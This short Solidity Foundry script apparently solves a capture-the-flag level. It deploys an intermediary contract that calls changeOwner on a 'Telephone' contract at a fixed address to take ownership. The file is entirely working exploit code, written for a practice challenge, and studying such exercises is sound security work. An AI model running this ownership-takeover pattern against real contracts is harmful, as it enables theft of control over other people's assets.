// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import {Script} from "forge-std/Script.sol";

contract AttackContract {
    Telephone telephone;

    constructor (address _address) {
        telephone = Telephone(_address);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}

contract TelephoneAttack is Script {
    Telephone public telephone = Telephone(0x6D1f543A6c217625776E3317bC84dECD23A32587);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        AttackContract attackContract = new AttackContract(address(telephone));

        attackContract.attack();

        vm.stopBroadcast();
    }
}